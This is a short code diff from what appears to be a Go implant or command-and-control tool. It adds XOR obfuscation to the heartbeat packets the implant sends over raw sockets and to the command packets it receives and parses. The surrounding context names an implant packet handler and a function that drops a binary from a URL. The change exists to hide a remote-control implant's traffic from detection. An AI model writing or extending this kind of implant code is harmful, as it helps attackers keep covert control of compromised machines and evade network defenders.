@@ -43,7 +43,7 @@ func generateHeartbeat(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.
 
 		// Create Cmd -> Encrypt -> Wrap with Identifier
 		data := cattails.CreateHello(iface.HardwareAddr, src)
-		// data = xorData(data)
+		data = rawsocket.XORCipher(data)
 		data = rawsocket.AddIdentifier(data, true)
 
 		// Send Packet
@@ -67,6 +67,7 @@ func dropBinary(url string, procname string) {
 
 func implantProcessPacket(packet gopacket.Packet, hostIP net.IP) {
 	data := rawsocket.RemoveIdentifier(string(packet.ApplicationLayer().Payload()), false)
+	data = rawsocket.XORCipher(data)
 	data = strings.Trim(data, "\n")
 
 	// Split into list to get command and args
